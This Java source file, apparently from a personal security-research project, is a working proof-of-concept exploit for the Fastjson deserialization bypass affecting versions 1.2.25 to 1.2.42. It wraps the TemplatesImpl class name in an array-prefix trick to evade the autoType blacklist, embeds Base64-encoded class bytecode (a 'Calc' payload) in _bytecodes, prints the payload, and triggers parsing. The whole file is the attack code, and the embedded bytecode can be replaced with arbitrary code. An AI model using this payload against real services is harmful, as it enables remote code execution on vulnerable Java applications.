import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class FastjsonBypass3 {
    public static void main(String[] args) throws IOException {
        // bypass fastjson 1.2.25 - 1.2.42
        final String NASTY_CLASS = "[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        final String CLASS_PATH = "/root/code/java/JavaSec/util/target/classes/org/ixpqxi/util/Calc.class";

        byte[] bytes = Files.readAllBytes(Paths.get(CLASS_PATH));
        String evilCode = Base64.getEncoder().encodeToString(bytes);

        String poc = "{" + "\"@type\":\"" + NASTY_CLASS + "\"[{," + "\"_bytecodes\":[\"" + evilCode + "\"]," + "\"_name\":\"Calc\"," + "\"_tfactory\":{}," + "\"_outputProperties\":{}" + "}";
        System.out.println(poc);

        ParserConfig config = new ParserConfig();
        config.setAutoTypeSupport(true);
        Object obj = JSON.parseObject(poc, Object.class, config, Feature.SupportNonPublicField);
    }
}
